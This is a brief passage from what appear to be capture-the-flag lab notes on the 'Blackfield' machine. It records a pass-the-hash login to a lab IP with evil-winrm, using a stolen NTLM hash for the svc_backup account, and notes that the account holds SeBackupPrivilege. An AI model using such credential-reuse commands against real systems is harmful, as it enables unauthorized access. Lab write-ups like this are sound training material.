Got initial foothold on the machine using the gathered hash for user `svc_backup` using evil-winrm
```bash
evil-winrm -i 10.10.10.192 -u 'BLACKFIELD.local\svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

Getting the privilege information for user `svc_backup`
![[Pasted image 20241011160817.png]]
The user has SeBackupPrivilege enabled.

